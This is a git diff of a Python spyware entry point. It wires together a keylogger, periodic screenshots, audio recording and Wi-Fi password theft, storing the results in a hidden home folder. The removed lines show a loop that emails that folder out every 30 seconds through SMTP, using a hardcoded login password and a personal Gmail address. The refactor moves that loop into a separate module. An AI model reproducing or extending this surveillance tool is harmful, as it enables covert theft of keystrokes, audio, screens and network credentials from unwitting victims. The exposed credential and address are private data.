@@ -1,33 +1,15 @@
-import sys
 import os
 import threading
-import time
 from pynput import keyboard
-from email_sender import send_email_with_attachments
+from email_sender import email_thread
 from logger_setup import operation_logger
 from screenshot import periodic_screenshots
 from audio_rec import record_audio
 from wifi_info import get_current_wifi_ssid, get_wifi_password
-from keylogger import on_press  # Importing on_press from keylogger module
+from keylogger import on_press  
 
-log_dir = "/Users/mannatvirk/.hiddenfolder"
-
-def email_thread(interval=30):
-    
-    while True:
-        try:
-            send_email_with_attachments(
-                sender="Private Person <hello@demomailtrap.com>",
-                receiver="A Test User <mannatvirk6841@gmail.com>",
-                folder_path=log_dir,
-                smtp_server="live.smtp.mailtrap.io",
-                port=587,
-                login_user="api",
-                login_password="ad9ae87d8204b728c11a09d7c502d5b3"
-            )
-        except Exception as e:
-            operation_logger.error(f"Error sending email: {e}")
-        time.sleep(interval)
+log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
+os.makedirs(log_dir, exist_ok=True)
 
 if __name__ == "__main__":
     # sys.stdout = open(os.devnull, 'w')
